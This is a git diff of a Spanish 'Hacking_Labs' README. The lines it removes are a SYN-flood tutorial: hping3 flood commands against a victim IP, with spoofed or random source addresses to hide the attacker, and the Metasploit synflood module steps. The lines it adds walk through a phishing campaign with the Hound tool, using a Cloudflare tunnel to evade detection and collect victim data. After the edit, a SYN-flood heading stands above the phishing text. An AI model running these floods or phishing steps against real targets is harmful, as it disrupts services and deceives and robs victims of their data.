@@ -21,8 +21,6 @@ bash hound.sh
 ```
 Después de realizar los pasos anteriores, aparecerá la pantalla adjunta
 
-
-
 <p align="center">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="images/hound.png">
@@ -31,139 +29,32 @@ Después de realizar los pasos anteriores, aparecerá la pantalla adjunta
 </picture>
 </p>
 
-
-
 > ### Trabajando con TCP-SYN Flood / SYN-ACK: HPing3 :computer:
-> <b>Hping3</b> es una aplicación de Kali Linux que permite analizar y ensamblar paquetes TCP/IP, aunque se utiliza para enviar paquetes TCP, UDP y RAW-IP. Su uso va desde el simple análisis de los paquetes, hasta probar la eficacia de un firewall a través de diferentes protocolos, la detección de paquetes sospechosos o modificados e incluso la protección frente a ataques DoS de un sistema o de un firewall.
-> Veamos diversos tipos de ataque SYN Flooding:
-
-- <b>Paso 1</b>: En la shell (con privilegios de administrador), lanzamos el comando o, si no está disponible, instalaremos el paquete mediante el código:
-<b>
-
-```
-apt-get install hping3
-```
-</b>
-
-- <b>Paso 2</b>: Podemos realizar un ataque muy sencillo de tipo DDoS con el comando:
-<b>
-
-```
-hping3 -p 80  -S --flood [ip_victima]
-```
-</b>
-Se puede comprobar que <b>-p</b> es utilizado para determinar el puerto, que <b>-S</b> activa la flag SYN del paquete TCP-IP, y que <b>--flood</b> indica que el envío de paquetes se realizará de la manera más rápida posible. Además, podemos encubrir el origen con múltiples variantes
-
-<b>
-
-```
-hping3 -a [ip_atacante_falsa] -p 80  -S --flood [ip_victima] # IP de origen encubierta
-```
-</b>
-
-<b>
-
-```
-hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada aleatoriamente
-```
-</b>
-
-<b>
-
-```
-hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.47
-```
-</b>
-Podemos comprobar que las variables <b>-c</b> determina la cantidad de paquetes que se enviarán, que <b>-S</b> activa la flag SYN del paquete TCP-IP, que <b>-p</b> es utilizado para determinar el puerto al que realizar el ataque, <b>-d</b> determina el tamaño de los paquetes que se envían y que <b>-w</b> sirve para mostrar las respuestas Windows.
+> Al ser un phishing, debemos tener en cuenta muchos factores, aunque el factor principal es la posible detección de nuestra campaña de phishing, por lo que, para evitar posibles detecciones, pulsamos Y en la opción de <b>Cloudflare</b>. 
+Se cargará todos los parámetros necesarios hasta proporcionarnos un enlace: https://cable-expenditures-col-hardware.trycloudflare.com.
 
 <p align="center">
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_4.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_4.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_4.png">
+  <source media="(prefers-color-scheme: dark)" srcset="images/hound2.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/hound2.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/hound2.png" width="50%">
 </picture>
 </p>
 
-> ### Trabajando con SYNFlood: METASPLOIT SynFlood :computer:
-> <b>SynFlood</b> es una de las herramientas auxiliares disponibles en el <b>Framework Metasploit</b> donde, de nuevo, la herramienta se aprovecha de un fallo en la forma en que la mayoría de los hosts tienen implementado el handshake TCP de tres vías.
-> Veamos la realización del ataque SYN Flooding:
-
-- <b>Paso 1</b>: En la shell (con privilegios de administrador), arrancamos PostGreSQL:
-<b>
-
-```
-service postgresql start
-```
-</b>
-
-- <b>Paso 2</b>: Posteriormente, cargamos el Framework Metasploit con ayuda del comando:
-<b>
-
-```
-msfconsole
-```
-</b>
+El usuario podría acceder al link, pero lo que realmente mostrará es un simple chat... Ahora bien, cuando la víctima comience a interactuar con el enlace, en el terminal de nuestro sistema aparecerán los siguientes datos:
 
 <p align="center">
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_5.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_5.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_5.png">
+  <source media="(prefers-color-scheme: dark)" srcset="images/hound3.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/hound3.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/hound3.png" width="50%">
 </picture>
 </p>
 
-- <b>Paso 3</b>: Ya en el Framework Metasploit, nos disponemos a cargar la herramienta auxiliar con ayuda del comando:
-<b>
-
-```
-use auxiliary/dos/tcp/synflood
-```
-</b>
-
-- <b>Paso 4</b>: Gracias al comando que mostramos a continuación, podemos configurar la IP de la víctima:
-<b>
-
-```
-set RHOST [ip_victima]
-```
-</b>
-
 <p align="center">
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_6.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_6.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_6.png">
-</picture>
-</p>
-
-Podemos comprobar si está o no configurado mediante:
-<b>
-
-```
-show options
-```
-</b>
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_7.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_7.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_7.png">
-</picture>
-</p>
-
-- <b>Paso 5</b>: Ya podemos realizar el ataque SYN Flood sin problema:
-<b>
-
-```
-Exploit
-```
-</b>
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_8.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_8.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_8.png">
+  <source media="(prefers-color-scheme: dark)" srcset="images/hound4.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/hound4.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/hound4.png" width="50%">
 </picture>
 </p>
